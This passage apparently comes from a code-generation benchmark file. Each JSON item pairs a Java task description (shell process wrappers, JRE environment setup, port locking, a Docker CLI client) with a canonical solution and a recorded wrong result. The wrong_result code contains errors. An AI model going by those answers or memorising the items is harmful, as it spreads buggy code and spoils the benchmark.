counter\n  - decrease() -> Integer: Decrements counter\n  - reset() -> void: Resets counter to zero",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport android.util.Log;\n\npublic class ShellStream {\n    public static final String TAG = Common.TAG + \".ShellStream\";\n    \n    protected Process mConnection;\n    protected DataOutputStream mStdInput;\n    protected BufferedReader mStdOutput;\n    protected Thread mStdOutputWorker;\n    protected OnStreamListener mListener;\n    protected final Counter mCounter = new Counter();\n    protected final Object mLock = new Object();\n    protected Boolean mIsActive = false;\n    protected Boolean mIsRoot = false;\n    protected String mCommandEnd = \"EOL:a00c38d8:EOL\";\n    \n    protected static class Counter {\n        private volatile Integer mCount = 0;\n        private volatile Object mLock = new Object();\n        \n        public Integer size() {\n            synchronized(mLock) {\n                return mCount;\n            }\n        }\n        \n        public Integer encrease() {\n            synchronized(mLock) {\n                return (mCount += 1);\n            }\n        }\n        \n        public Integer decrease() {\n            synchronized(mLock) {\n                return mCount > 0 ? (mCount -= 1) : (mCount = 0);\n            }\n        }\n        \n        public void reset() {\n            synchronized(mLock) {\n                mCount = 0;\n            }\n        }\n    }\n    \n    public static interface OnStreamListener {\n        public void onStreamStart();\n        public void onStreamInput(String outputLine);\n        public void onStreamStop(Integer resultCode);\n        public void onStreamDied();\n    }\n    \n    public ShellStream(Boolean requestRoot, OnStreamListener listener) {\n        try {\n            if(Common.DEBUG)Log.d(TAG, \"Construct: Establishing a new shell stream\");\n            \n            ProcessBuilder builder = new ProcessBuilder(requestRoot ? \"su\" : \"sh\");\n            builder.redirectErrorStream(true);\n            \n            mIsRoot = requestRoot;\n            mIsActive = true;\n            mListener = listener;\n            mConnection = builder.start();\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            \n            mStdOutputWorker = new Thread() {\n                @Override\n                public void run() {\n                    String output = null;\n                    \n                    try {\n                        while (mIsActive && (output = mStdOutput.readLine()) != null) {\n                            if (mListener != null && mCounter.size() > 0) {\n                                if (output.contains(mCommandEnd)) {\n                                    Integer result = 0;\n                                    \n                                    try {\n                                        if (output.startsWith(mCommandEnd)) {\n                                            result = Integer.parseInt(output.substring(mCommandEnd.length()+1));\n                                            \n                                        } else {\n                                            result = 1;\n                                        }\n                                        \n                                    } catch (Throwable e) {\n                                        Log.w(TAG, e.getMessage(), e);\n                                    }\n                                    \n                                    mListener.onStreamStop(result);\n                                    mCounter.decrease();\n                                    \n                                    synchronized(mLock) {\n                                        mLock.notifyAll();\n                                    }\n                                    \n                                } else {\n                                    mListener.onStreamInput(output);\n                                }\n                            }\n                        }\n                        \n                    } catch (IOException e) {\n                        Log.w(TAG, e.getMessage(), e); output = null;\n                    }\n                    \n                    if (output == null) {\n                        ShellStream.this.destroy();\n                    }\n                }\n            };\n            \n            mStdOutputWorker.start();\n            \n        } catch (IOException e) {\n            Log.w(TAG, e.getMessage(), e); mIsActive = false;\n        }\n    }\n    \n    public synchronized void execute(final String command) {\n        final Object lock = new Object();\n        \n        new Thread() {\n            @Override\n            public void run() {\n                mCounter.encrease();\n                \n                synchronized(lock) {\n                    lock.notifyAll();\n                }\n                \n                synchronized(mLock) {\n                    if (waitFor(0, -1)) {\n                        mListener.onStreamStart();\n                        \n                        String input = command + \"\\n\";\n                        input += \"    echo \" + mCommandEnd + \" $?\\n\";\n                        \n                        try {\n                            mStdInput.write( input.getBytes() );\n                            \n                            if (mStdInput != null) {\n                                mStdInput.flush();\n                            }\n                            \n                        } catch (IOException e) {\n                            Log.w(TAG, e.getMessage(), e);\n                        }\n                    }\n                }\n            }\n            \n        }.start();\n        \n        synchronized (lock) {\n            try {\n                lock.wait();\n                \n            } catch (InterruptedException e) {}\n        }\n    }\n    \n    public Boolean waitFor() {\n        return waitFor(0, 0);\n    }\n    \n    public Boolean waitFor(Integer timeout) {\n        return waitFor(timeout, 0);\n    }\n    \n    protected Boolean waitFor(Integer timeout, Integer index) {\n        Integer counter = mCounter.size()+index;\n        \n        if (counter > 0) {\n            Long timeoutMilis = timeout > 0 ? System.currentTimeMillis() + timeout : 0L;\n            \n            synchronized(mLock) {\n                while (mCounter.size() > 0 && mIsActive) {\n                    try {\n                        counter -= 1;\n                        \n                        mLock.wait(timeout.longValue());\n                        \n                        if (timeout > 0 && System.currentTimeMillis() >= timeoutMilis) {\n                            return mCounter.size() == 0 && mIsActive;\n                            \n                        } else if (counter <= 0) {\n                            return mIsActive;\n                        }\n                        \n                    } catch (InterruptedException e) {\n                        Log.w(TAG, e.getMessage(), e);\n                    }\n                }\n            }\n        }\n        \n        return mIsActive;\n    }\n    \n    public Boolean isActive() {\n        return mIsActive;\n    }\n    \n    public Boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n    \n    public Boolean isRoot() {\n        return mIsRoot;\n    }\n    \n    public synchronized void destroy() {\n        if (mStdInput != null) {\n            mIsActive = false;\n            \n            mCounter.reset();\n            \n            try {\n                mStdInput.close();\n                mStdInput = null;\n                \n            } catch (IOException e) {}\n            \n            mStdOutputWorker.interrupt();\n            mStdOutputWorker = null;\n            \n            synchronized (mLock) {\n                mLock.notifyAll();\n            }\n            \n            mListener.onStreamDied();\n            mListener = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellStream {\n    private Process mConnection;\n    private DataOutputStream mStdInput;\n    private BufferedReader mStdOutput;\n    private Thread mStdOutputWorker;\n    private OnStreamListener mListener;\n    private Counter mCounter;\n    private final Object mLock = new Object();\n    private boolean mIsActive = false;\n    private boolean mIsRoot;\n    private String mCommandEnd = \"\\n\";\n\n    public ShellStream(Boolean requestRoot, OnStreamListener listener) {\n        mIsRoot = requestRoot;\n        mListener = listener;\n        mCounter = new Counter();\n        mIsActive = true;\n\n        try {\n            ProcessBuilder pb = new ProcessBuilder();\n            if (mIsRoot) {\n                pb.command(\"su\");\n            } else {\n                pb.command(\"sh\");\n            }\n            pb.redirectErrorStream(true);\n            mConnection = pb.start();\n\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n\n            mStdOutputWorker = new Thread(() -> {\n                String line;\n                try {\n                    while ((line = mStdOutput.readLine()) != null) {\n                        mListener.onStreamInput(line);\n                    }\n                } catch (IOException e) {\n                    mListener.onStreamDied();\n                } finally {\n                    synchronized (mLock) {\n                        mCounter.decrease();\n                        if (mCounter.size() == 0) {\n                            mListener.onStreamStop(mConnection.exitValue());\n                        }\n                    }\n                }\n            });\n            mStdOutputWorker.start();\n        } catch (Exception e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public void execute(String command) {\n        synchronized (mLock) {\n            mCounter.encrease();\n        }\n        mListener.onStreamStart();\n        try {\n            mStdInput.writeBytes(command + mCommandEnd);\n            mStdInput.flush();\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public boolean waitFor() {\n        return waitFor(0);\n    }\n\n    public boolean waitFor(int timeout) {\n        return waitFor(timeout, 0);\n    }\n\n    private boolean waitFor(int timeout, int index) {\n        synchronized (mLock) {\n            long startTime = System.currentTimeMillis();\n            while (mCounter.size() > 0) {\n                if (timeout > 0 && System.currentTimeMillis() - startTime > timeout) {\n                    return false;\n                }\n                try {\n                    mLock.wait(100);\n                } catch (InterruptedException e) {\n                    return false;\n                }\n            }\n            return true;\n        }\n    }\n\n    public boolean isActive() {\n        return mIsActive;\n    }\n\n    public boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n\n    public boolean isRoot() {\n        return mIsRoot;\n    }\n\n    public void destroy() {\n        synchronized (mLock) {\n            if (mConnection != null) {\n                mIsActive = false;\n                mConnection.destroy();\n                try {\n                    mStdOutputWorker.join();\n                } catch (InterruptedException e) {\n                    mListener.onStreamDied();\n                }\n                mListener.onStreamDied();\n            }\n        }\n    }\n\n    public interface OnStreamListener {\n        void onStreamStart();\n        void onStreamInput(String line);\n        void onStreamStop(int exitCode);\n        void onStreamDied();\n    }\n\n    public static class Counter {\n        private AtomicInteger count = new AtomicInteger(0);\n\n        public int size() {\n            return count.get();\n        }\n\n        public int encrease() {\n            return count.incrementAndGet();\n        }\n\n        public int decrease() {\n            return count.decrementAndGet();\n        }\n\n        public void reset() {\n            count.set(0);\n        }\n    }\n}"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: The task involves creating a Java utility class that manages environment variables for a Java Runtime Environment (JRE) and handles log redirection from an external process. The class should provide methods to configure the JRE environment and redirect logs from the Android `logcat` command to a custom logger.\n\nClass Description: This utility class is designed to set up the JRE environment by configuring various system environment variables and redirecting logs from an external process (`logcat`) to a custom logger. It is particularly useful for Android applications that need to manage JRE environments and log outputs dynamically.\n\nAttributes:\n\n- `NATIVE_LIB_DIR`: String - The directory path for native libraries.\n- `LD_LIBRARY_PATH`: String - The library path for dynamic linking.\n- `LOCAL_RENDERER`: String - The renderer type for graphics (e.g., \"opengles3_desktopgl_angle_vulkan\").\n- `jvmLibraryPath`: String - The path to the JVM library (e.g., \"server/libjvm.so\" or \"client/libjvm.so\").\n- `logcatPb`: ProcessBuilder - A ProcessBuilder instance for executing the `logcat` command.\n- `failTime`: int - A counter to track the number of failed attempts to start the `logcat` process.\n\nMethods:\n\n- `redirectAndPrintJRELog()`: void - Starts a new thread to redirect and print JRE logs from the `logcat` command. The method configures the `logcat` command to filter specific log tags and redirects the output to a custom logger. If the process fails, it retries up to 10 times.\n- `setJavaEnvironment(Activity activity, String jreHome)`: void - Configures the JRE environment by setting various system environment variables. The method reads additional environment variables from a custom file (`custom_env.txt`) and applies them. It also sets the `LD_LIBRARY_PATH` and `PATH` variables to include the JRE binaries and native libraries.\n  - Input:\n    - `activity`: Activity - The Android activity context.\n    - `jreHome`: String - The home directory of the JRE.\n  - Output: None (void).\n- `setLdLibraryPath(String path)`: void - Sets the `LD_LIBRARY_PATH` environment variable to the specified path.\n  - Input:\n    - `path`: String - The new library path.\n  - Output: None (void).\n\nNote: The class assumes the presence of helper classes like `Logger`, `Tools`, `LauncherPreferences`, and `ExtraCore` for logging, file operations, and preference management. These dependencies should be handled appropriately in the implementation.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport android.system.Os;\nimport android.system.ErrnoException;\n\npublic static void redirectAndPrintJRELog() {\n    new Thread(new Runnable(){\n        int failTime = 0;\n        ProcessBuilder logcatPb;\n        @Override\n        public void run() {\n            try {\n                if (logcatPb == null) {\n                    logcatPb = new ProcessBuilder().command(\"logcat\", \"-v\", \"brief\", \"-s\", \"jrelog:I\", \"LIBGL:I\", \"NativeInput\").redirectErrorStream(true);\n                }\n\n                new ProcessBuilder().command(\"logcat\", \"-c\").redirectErrorStream(true).start();\n                java.lang.Process p = logcatPb.start();\n\n                byte[] buf = new byte[1024];\n                int len;\n                while ((len = p.getInputStream().read(buf)) != -1) {\n                    String currStr = new String(buf, 0, len);\n                    Logger.appendToLog(currStr);\n                }\n\n                if (p.waitFor() != 0) {\n                    failTime++;\n                    if (failTime <= 10) {\n                        run();\n                    } else {\n                        Logger.appendToLog(\"ERROR: Unable to get more log.\");\n                    }\n                }\n            } catch (Throwable e) {\n                Logger.appendToLog(\"Exception on logging thread:\\n\" + Log.getStackTraceString(e));\n            }\n        }\n    }).start();\n}\n\npublic static void setJavaEnvironment(Activity activity, String jreHome) throws Throwable {\n    Map<String, String> envMap = new ArrayMap<>();\n    envMap.put(\"POJAV_NATIVEDIR\", NATIVE_LIB_DIR);\n    envMap.put(\"JAVA_HOME\", jreHome);\n    envMap.put(\"HOME\", Tools.DIR_GAME_HOME);\n    envMap.put(\"TMPDIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"LIBGL_MIPMAP\", \"3\");\n    envMap.put(\"LIBGL_NOERROR\", \"1\");\n    envMap.put(\"LIBGL_NOINTOVLHACK\", \"1\");\n    envMap.put(\"LIBGL_NORMALIZE\", \"1\");\n\n    if(PREF_DUMP_SHADERS)\n        envMap.put(\"LIBGL_VGPU_DUMP\", \"1\");\n    if(PREF_ZINK_PREFER_SYSTEM_DRIVER)\n        envMap.put(\"POJAV_ZINK_PREFER_SYSTEM_DRIVER\", \"1\");\n    if(PREF_VSYNC_IN_ZINK)\n        envMap.put(\"POJAV_VSYNC_IN_ZINK\", \"1\");\n    if(Tools.deviceHasHangingLinker())\n        envMap.put(\"POJAV_EMUI_ITERATOR_MITIGATE\", \"1\");\n\n    envMap.put(\"LIBGL_ES\", (String) ExtraCore.getValue(ExtraConstants.OPEN_GL_VERSION));\n    envMap.put(\"FORCE_VSYNC\", String.valueOf(LauncherPreferences.PREF_FORCE_VSYNC));\n    envMap.put(\"MESA_GLSL_CACHE_DIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"force_glsl_extensions_warn\", \"true\");\n    envMap.put(\"allow_higher_compat_version\", \"true\");\n    envMap.put(\"allow_glsl_extension_directive_midshader\", \"true\");\n    envMap.put(\"MESA_LOADER_DRIVER_OVERRIDE\", \"zink\");\n    envMap.put(\"VTEST_SOCKET_NAME\", new File(Tools.DIR_CACHE, \".virgl_test\").getAbsolutePath());\n\n    envMap.put(\"LD_LIBRARY_PATH\", LD_LIBRARY_PATH);\n    envMap.put(\"PATH\", jreHome + \"/bin:\" + Os.getenv(\"PATH\"));\n    if(FFmpegPlugin.isAvailable) {\n        envMap.put(\"PATH\", FFmpegPlugin.libraryPath+\":\"+envMap.get(\"PATH\"));\n    }\n\n    if(LOCAL_RENDERER != null) {\n        envMap.put(\"POJAV_RENDERER\", LOCAL_RENDERER);\n        if(LOCAL_RENDERER.equals(\"opengles3_desktopgl_angle_vulkan\")) {\n            envMap.put(\"LIBGL_ES\", \"3\");\n            envMap.put(\"POJAVEXEC_EGL\",\"libEGL_angle.so\");\n        }\n    }\n\n    File customEnvFile = new File(Tools.DIR_GAME_HOME, \"custom_env.txt\");\n    if (customEnvFile.exists() && customEnvFile.isFile()) {\n        BufferedReader reader = new BufferedReader(new FileReader(customEnvFile));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            int index = line.indexOf(\"=\");\n            envMap.put(line.substring(0, index), line.substring(index + 1));\n        }\n        reader.close();\n    }\n\n    for (Map.Entry<String, String> env : envMap.entrySet()) {\n        try {\n            Os.setenv(env.getKey(), env.getValue(), true);\n        }catch (NullPointerException exception){\n            Log.e(\"JREUtils\", exception.toString());\n        }\n    }\n\n    File serverFile = new File(jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/server/libjvm.so\");\n    jvmLibraryPath = jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/\" + (serverFile.exists() ? \"server\" : \"client\");\n    setLdLibraryPath(jvmLibraryPath+\":\"+LD_LIBRARY_PATH);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class JREEnvironmentUtil {\n    private String NATIVE_LIB_DIR;\n    private String LD_LIBRARY_PATH;\n    private String LOCAL_RENDERER;\n    private String jvmLibraryPath;\n    private ProcessBuilder logcatPb;\n    private int failTime;\n\n    public void redirectAndPrintJRELog() {\n        new Thread(() -> {\n            while (failTime < 10) {\n                try {\n                    logcatPb = new ProcessBuilder(\"logcat\", \"-c\", \"-v\", \"threadtime\", \"JRE\", \"LOG\");\n                    logcatPb.environment().put(\"LD_LIBRARY_PATH\", this.LD_LIBRARY_PATH);\n                    logcatPb.environment().put(\"PATH\", this.PATH);\n                    Process process = logcatPb.start();\n                    InputStream is = process.getInputStream();\n                    InputStreamReader isr = new InputStreamReader(is);\n                    BufferedReader br = new BufferedReader(isr);\n                    String line;\n                    while ((line = br.readLine()) != null) {\n                        Logger.logStream(line);\n                    }\n                    int exitCode = process.waitFor();\n                    if (exitCode != 0) {\n                        failTime++;\n                        Thread.sleep(1000);\n                    } else {\n                        break;\n                    }\n                } catch (Exception e) {\n                    failTime++;\n                    Thread.sleep(1000);\n                }\n            }\n        }).start();\n    }\n\n    public void setJavaEnvironment(Activity activity, String jreHome) {\n        Map<String, String> envVars = Tools.readEnvFile(activity);\n        this.NATIVE_LIB_DIR = jreHome + \"/native\";\n        this.jvmLibraryPath = jreHome + \"/libjvm.so\";\n        this.LD_LIBRARY_PATH = envVars.getOrDefault(\"LD_LIBRARY_PATH\", \"\");\n        this.LD_LIBRARY_PATH += \":\" + jreHome + \"/lib\";\n        this.LOCAL_RENDERER = envVars.getOrDefault(\"LOCAL_RENDERER\", \"opengles3_desktopgl_angle_vulkan\");\n    }\n\n    public void setLdLibraryPath(String path) {\n        this.LD_LIBRARY_PATH = path;\n    }\n}"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of shell commands from within an Android application, providing methods to start, monitor, and interact with the external process, including reading its output and checking its exit status.\n\nClass Description: The ShellCommand class encapsulates functionality for executing shell commands, handling process I/O streams, and managing process lifecycle. It's designed for Android environments (evidenced by android.util.Log usage) and provides both synchronous and asynchronous operation modes.\n\nAttributes:\nrt: [Runtime] - Reference to Java Runtime environment for process execution\ncommand: [String[]] - Array containing the shell command and its arguments\ntag: [String] - Identifier for logging purposes\nprocess: [Process] - Reference to the running process instance\nstdout: [BufferedReader] - Reader for process output stream\nerror: [String] - Stores any error message encountered during execution\nexitval: [int] - Exit value of the completed process (-1 if not terminated)\n\nMethods:\nShellCommand: [constructor](String[] command) -> [void] - Initializes with command to execute\nShellCommand: [constructor](String[] command, String tag) -> [void] - Initializes with command and logging tag\nstart: [void](boolean waitForExit) -> [void] - Starts the process, optionally waiting for completion\nwaitForExit: [void]() -> [void] - Blocks until process completes while reading output\nfinish: [void]() -> [void] - Cleans up process resources\ncheckForExit: [boolean]() -> [boolean] - Checks if process has terminated\nstdoutAvailable: [boolean]() -> [boolean] - Checks if output is ready to read\nreadStdoutBlocking: [String]() -> [String] - Reads a line of output (blocks until available)\nreadStdout: [String]() -> [String] - Reads a line of output if available (non-blocking)",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ShellCommand {\n    Runtime rt;\n    String[] command;\n    String tag = \"\";\n    Process process;\n    BufferedReader stdout;\n    public String error;\n    public int exitval;\n\n    public ShellCommand(String[] command, String tag) {\n        this(command);\n        this.tag = tag;\n    }\n\n    public ShellCommand(String[] command) {\n        this.command = command;\n        rt = Runtime.getRuntime();\n    }\n\n    public void start(boolean waitForExit) {\n        exitval = -1;\n        error = null;\n\n        try {\n            process = new ProcessBuilder().command(command).redirectErrorStream(true).start();\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        } catch (Exception e) {\n            error = e.getCause().getMessage();\n            return;\n        }\n\n        if (waitForExit) {\n            waitForExit();\n        }\n    }\n\n    public void waitForExit() {\n        while (!checkForExit()) {\n            if (stdoutAvailable()) {\n                Log.d(\"AFWALL\", \"ShellCommand waitForExit [\" + tag\n                        + \"] discarding read: \" + readStdout());\n            } else {\n                try {\n                    Thread.sleep(100);\n                } catch (Exception e) {\n                    Log.d(\"AFWall\", \"waitForExit\", e);\n                }\n            }\n        }\n    }\n\n    public void finish() {\n        try {\n            if (stdout != null) {\n                stdout.close();\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"Exception finishing [\" + tag + \"]\", e);\n        }\n\n        if(process !=null) {\n            process.destroy();\n        }\n        process = null;\n    }\n\n    public boolean checkForExit() {\n        try {\n            if(process != null) {\n                exitval = process.exitValue();\n            } else {\n                finish();\n            }\n        } catch (IllegalThreadStateException e) {\n            return false;\n        }\n\n        finish();\n        return true;\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (java.io.IOException e) {\n            Log.e(\"AFWall\", \"stdoutAvailable error\", e);\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        String line;\n        if (stdout == null) {\n            return null;\n        }\n        try {\n            line = stdout.readLine();\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdoutBlocking error\", e);\n            return null;\n        }\n        if (line == null) {\n            return null;\n        } else {\n            return line + \"\\n\";\n        }\n    }\n\n    public String readStdout() {\n        if (stdout == null) {\n            return null;\n        }\n\n        try {\n            if (stdout.ready()) {\n                String line = stdout.readLine();\n                if (line == null) {\n                    return null;\n                } else {\n                    return line + \"\\n\";\n                }\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdout error\", e);\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellCommand {\n    private final String[] command;\n    private final String tag;\n    private Process process;\n    private BufferedReader stdout;\n    private String error;\n    private int exitval;\n\n    public ShellCommand(String[] command) {\n        this.command = command;\n        this.tag = \"ShellCommand\";\n    }\n\n    public ShellCommand(String[] command, String tag) {\n        this.command = command;\n        this.tag = tag;\n    }\n\n    public void start(boolean waitForExit) {\n        try {\n            process = Runtime.getRuntime().exec(command);\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            BufferedReader errorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n            \n            Thread stdoutThread = new Thread(() -> {\n                try {\n                    String line;\n                    while ((line = stdout.readLine()) != null) {\n                        android.util.Log.d(tag, line);\n                    }\n                } catch (IOException e) {\n                    android.util.Log.e(tag, \"Error reading stdout\", e);\n                }\n            });\n            Thread errorThread = new Thread(() -> {\n                try {\n                    String line;\n                    while ((line = errorStream.readLine()) != null) {\n                        android.util.Log.e(tag, line);\n                    }\n                } catch (IOException e) {\n                    android.util.Log.e(tag, \"Error reading error stream\", e);\n                }\n            });\n            stdoutThread.start();\n            errorThread.start();\n            \n            if (waitForExit) {\n                process.waitFor();\n                exitval = process.exitValue();\n            }\n        } catch (IOException | InterruptedException e) {\n            android.util.Log.e(tag, \"Error starting process\", e);\n            this.error = e.getMessage();\n        }\n    }\n\n    public void waitForExit() {\n        try {\n            process.waitFor();\n            exitval = process.exitValue();\n        } catch (InterruptedException e) {\n            android.util.Log.e(tag, \"Error waiting for process exit\", e);\n            this.error = e.getMessage();\n        }\n    }\n\n    public void finish() {\n        if (process != null) {\n            process.destroy();\n            process = null;\n        }\n        if (stdout != null) {\n            try {\n                stdout.close();\n            } catch (IOException e) {\n                android.util.Log.e(tag, \"Error closing stdout\", e);\n            }\n            stdout = null;\n        }\n    }\n\n    public boolean checkForExit() {\n        return process == null || !process.isAlive();\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (IOException e) {\n            android.util.Log.e(tag, \"Error checking stdout availability\", e);\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        try {\n            return stdout.readLine();\n        } catch (IOException e) {\n            android.util.Log.e(tag, \"Error reading stdout blocking\", e);\n            return null;\n        }\n    }\n\n    public String readStdout() {\n        if (stdoutAvailable()) {\n            try {\n                return stdout.readLine();\n            } catch (IOException e) {\n                android.util.Log.e(tag, \"Error reading stdout\", e);\n                return null;\n            }\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a class for managing temporary port allocations using file locks to ensure exclusive access to ports during testing or other temporary usage scenarios.\n\nClass Description: The TemporaryPorts class provides a mechanism to acquire and manage temporary port allocations using file-based locks. It creates lock files in a specified directory to represent port allocations and ensures exclusive access through FileChannel locks.\n\nAttributes:\n- DEFAULT_LOCK_DIRECTORY: [Path] - Default directory path for storing port lock files (\"/tmp/helios-test/ports/\")\n- lockDirectory: [Path] - Custom directory path for storing port lock files\n- ports: [List<AllocatedPort>] - List of currently allocated ports\n\nMethods:\n- TemporaryPorts([Path lockDirectory]) -> [void] - Constructor that initializes the lock directory and creates it if it doesn't exist\n- tryAcquire([String name, int port]) -> [AllocatedPort] - Attempts to acquire a port lock, returns AllocatedPort if successful or null if port is already locked\n- lock([int port, String name]) -> [AllocatedPort] - Internal method that performs the actual port locking operation using FileChannel\n- AllocatedPort([int port, Path path, FileChannel file, FileLock lock]) -> [void] - Nested class constructor representing an allocated port\n- port() -> [int] - Returns the allocated port number\n- release() -> [void] - Releases the port lock, closes the file channel, and deletes the lock file",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport com.google.common.collect.Lists;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.List;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.WRITE;\nimport static java.nio.charset.StandardCharsets.UTF_8;\nimport static java.lang.String.format;\n\npublic class TemporaryPorts {\n\n  private static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n  private final Path lockDirectory;\n  private final List<AllocatedPort> ports = Lists.newArrayList();\n\n  public TemporaryPorts(final Path lockDirectory) {\n    this.lockDirectory = lockDirectory;\n    try {\n      Files.createDirectories(lockDirectory);\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public AllocatedPort tryAcquire(final String name, final int port) {\n    final AllocatedPort allocatedPort = lock(port, name);\n    if (allocatedPort == null) {\n      return null;\n    }\n    ports.add(allocatedPort);\n    return allocatedPort;\n  }\n\n  private AllocatedPort lock(final int port, final String name) {\n    final Path path = lockDirectory.resolve(String.valueOf(port));\n    try {\n      final FileChannel file = FileChannel.open(path, CREATE, WRITE);\n      final FileLock lock = file.tryLock();\n      if (lock == null) {\n        return null;\n      }\n      file.write(ByteBuffer.wrap(format(\"%d %s%n\", port, name).getBytes(UTF_8)));\n      file.force(true);\n      return new AllocatedPort(port, path, file, lock);\n    } catch (OverlappingFileLockException e) {\n      return null;\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public static class AllocatedPort {\n    private final int port;\n    private final Path path;\n    private final FileChannel file;\n    private final FileLock lock;\n\n    private AllocatedPort(final int port, final Path path, FileChannel file, FileLock lock) {\n      this.port = port;\n      this.path = path;\n      this.file = file;\n      this.lock = lock;\n    }\n\n    public int port() {\n      return port;\n    }\n\n    public void release() {\n      try {\n        if (lock.isValid()) {\n          lock.release();\n        }\n        file.close();\n        Files.deleteIfExists(path);\n      } catch (IOException e) {\n        throw new RuntimeException(e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class TemporaryPorts {\n    public static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n    private final Path lockDirectory;\n    private final List<AllocatedPort> ports = new ArrayList<>();\n\n    public TemporaryPorts(Path lockDirectory) {\n        this.lockDirectory = lockDirectory != null ? lockDirectory : DEFAULT_LOCK_DIRECTORY;\n        try {\n            Files.createDirectories(this.lockDirectory);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to create lock directory\", e);\n        }\n    }\n\n    public AllocatedPort tryAcquire(String name, int port) {\n        AllocatedPort allocated = lock(port, name);\n        if (allocated != null) {\n            ports.add(allocated);\n        }\n        return allocated;\n    }\n\n    private AllocatedPort lock(int port, String name) {\n        Path filePath = lockDirectory.resolve(\"port-\" + port + \".lock\");\n        if (Files.exists(filePath)) {\n            return null;\n        }\n        try {\n            Files.createFile(filePath);\n            FileChannel fileChannel = FileChannel.open(filePath, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            FileLock fileLock = fileChannel.tryLock();\n            if (fileLock == null) {\n                return null;\n            }\n            return new AllocatedPort(port, filePath, fileChannel, fileLock);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public static class AllocatedPort {\n        private final int port;\n        private final Path path;\n        private final FileChannel file;\n        private final FileLock lock;\n\n        public AllocatedPort(int port, Path path, FileChannel file, FileLock lock) {\n            this.port = port;\n            this.path = path;\n            this.file = file;\n            this.lock = lock;\n        }\n\n        public int port() {\n            return port;\n        }\n\n        public void release() {\n            try {\n                if (lock != null) {\n                    lock.release();\n                }\n                if (file != null) {\n                    file.close();\n                }\n                Files.delete(path);\n            } catch (IOException e) {\n                throw new RuntimeException(\"Failed to release port lock\", e);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Create a Java class that implements a Docker client using ProcessBuilder to interact with the Docker CLI, handling process execution, input/output streams, and error handling.\n\nClass Description: CliDockerClient is a Docker client implementation that uses ProcessBuilder to execute Docker CLI commands. It manages process creation, stream handling, and timeout control for Docker operations.\n\nAttributes:\n- processBuilderFactory: Function<List<String>, ProcessBuilder> - Factory function to create ProcessBuilder instances configured for Docker commands\n- DEFAULT_DOCKER_CLIENT: Path - Default path to the Docker executable\n- DOCKER_OUTPUT_TIMEOUT: Long - Timeout duration for Docker command execution (10 minutes)\n\nMethods:\n- CliDockerClient(Path, Map<String,String>) -> void - Constructor that initializes the client with Docker executable path and environment variables\n- CliDockerClient(Function<List<String>,ProcessBuilder>) -> void - Internal constructor accepting a ProcessBuilder factory function\n- defaultProcessBuilderFactory(String,ImmutableMap<String,String>) -> Function<List<String>,ProcessBuilder> - Creates default ProcessBuilder factory with Docker executable and environment\n- getStderrOutput(Process) -> String - Helper method to read error stream from a process\n- docker(String...) -> Process - Executes a Docker subcommand and returns the Process instance\n- info() -> DockerInfoDetails - Executes 'docker info' command and returns parsed information\n- fetchInfoDetails() -> DockerInfoDetails - Internal method to fetch and parse Docker info details",
